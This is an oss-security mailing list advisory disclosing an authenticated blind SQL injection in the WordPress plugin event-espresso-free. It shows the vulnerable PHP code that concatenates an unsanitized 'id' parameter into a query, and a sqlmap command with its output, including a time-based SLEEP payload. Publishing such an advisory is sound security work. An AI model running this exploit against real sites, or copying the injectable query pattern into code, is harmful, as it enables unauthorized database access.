  oss-security - Blind SQL injection in wordpress plugin event-espresso-free  fixed in            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 11 Jul From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Blind SQL injection in wordpress plugin event-espresso-free  fixed in  Title: Blind SQL injection in wordpress plugin event-espresso-free Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/event-espresso-free/ Vendor: https://eventespresso.com/ Vendor Notified: fixed Vendor Contact: plugins@...dpress.org Advisory: Description: Event Espresso Lite – Event Management and Registration System Vulnerability: The function  edit_event_category does not sanitize user-supplied input via the $id parameter before passing it into an SQL statement.  This allows a blind SQL attack by an authenticated user who can edit the event categories.   2-function edit_event_category(){ 3-	global $wpdb; 4-	 5:	$id=$_REQUEST['id']; 6-	$results = $wpdb->get_results("SELECT * FROM ". EVENTS_CATEGORY_TABLE ." WHERE id =".$id); 7-	foreach ($results as $result){ 8-		$category_id = $result->id; 9-		$category_name = stripslashes($result->category_name); 10-		$category_identifier = stripslashes($result->category_identifier);  Export: JSON TEXT XML Exploit Code: 	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?page=event_categories&action=edit&id=*' --load-cookies=./cookie.txt --level=2 --risk=2 --dbms=mysql 	•   	•   	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* (URI) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace 	•     Payload: http://example.com:80/wordpress/wp-admin/admin.php?page=event_categories&action=edit&id=(CASE WHEN THEN SLEEP(5) ELSE END) 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 	•   	• [*] shutting down at 	•   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      